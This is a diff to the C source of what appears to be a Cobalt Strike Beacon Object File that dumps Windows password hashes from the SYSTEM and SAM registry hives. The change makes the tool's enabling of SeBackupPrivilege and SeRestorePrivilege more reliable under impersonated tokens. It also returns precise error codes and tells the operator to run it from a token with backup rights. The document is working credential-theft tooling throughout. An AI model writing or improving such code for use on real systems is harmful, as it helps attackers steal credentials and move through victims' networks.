@@ -117,32 +117,47 @@ BOOL DecryptAES_CBC( const BYTE *key, DWORD keyLen,const BYTE *iv,DWORD ivLen, c
     return TRUE;
 }
 
-// Enable required privileges
-BOOL EnablePrivilege(LPCWSTR privilege)
+// Enable a privilege on the EFFECTIVE token: the calling thread's when it is
+// impersonating (kernel privilege checks see that one, not the process token),
+// else the process token. Returns 0 when enabled, 1300 when the token does not
+// hold the privilege (minimised/stripped token), other Win32 errors as-is.
+DWORD EnablePrivilege(LPCWSTR privilege)
 {
-    HANDLE hToken;
+    HANDLE hToken = NULL;
     LUID luid;
     TOKEN_PRIVILEGES tkp;
 
-    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
-        return FALSE;
+    // OpenAsSelf: open the thread token using the process context, so the open
+    // cannot fail on the very impersonation we are trying to adjust
+    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, TRUE, &hToken)) {
+        if (KERNEL32$GetLastError() != ERROR_NO_TOKEN)
+            return KERNEL32$GetLastError();
+        if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+            return KERNEL32$GetLastError();
+    }
 
     if (!ADVAPI32$LookupPrivilegeValueA(NULL, privilege, &luid)) {
+        DWORD rc = KERNEL32$GetLastError();
         KERNEL32$CloseHandle(hToken);
-        return FALSE;
+        return rc;
     }
 
     tkp.PrivilegeCount = 1;
     tkp.Privileges[0].Luid = luid;
     tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
+    // succeeds with ERROR_NOT_ALL_ASSIGNED when the token lacks the privilege;
+    // SetLastError(0) first or a stale error decides the read-back
+    KERNEL32$SetLastError(0);
     if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
+        DWORD rc = KERNEL32$GetLastError();
         KERNEL32$CloseHandle(hToken);
-        return FALSE;
+        return rc;
     }
 
+    DWORD rc = KERNEL32$GetLastError();
     KERNEL32$CloseHandle(hToken);
-    return TRUE;
+    return rc;
 }
 
 // Get current control set from SYSTEM hive
@@ -260,13 +275,19 @@ void go()
     LONG res;
     const char *tempSystemKey = "BACKUP1";
 
-    if (!EnablePrivilege(SE_BACKUP_NAME)) {
-        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to enable backup privileges. Are you local admin?");
+    DWORD rc = EnablePrivilege(SE_BACKUP_NAME);
+    if (rc != 0) {
+        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] SeBackupPrivilege: %s (%d)",
+                     rc == ERROR_NOT_ALL_ASSIGNED ? "not held by this token - minimised or stripped; run from a token with backup rights" : "enable failed",
+                     rc);
         return;
     }
 
-    if (!EnablePrivilege(SE_RESTORE_NAME)) {
-        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to enable restore privileges. Are you local admin?");
+    rc = EnablePrivilege(SE_RESTORE_NAME);
+    if (rc != 0) {
+        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] SeRestorePrivilege: %s (%d)",
+                     rc == ERROR_NOT_ALL_ASSIGNED ? "not held by this token - minimised or stripped; run from a token with backup rights" : "enable failed",
+                     rc);
         return;
     }
 
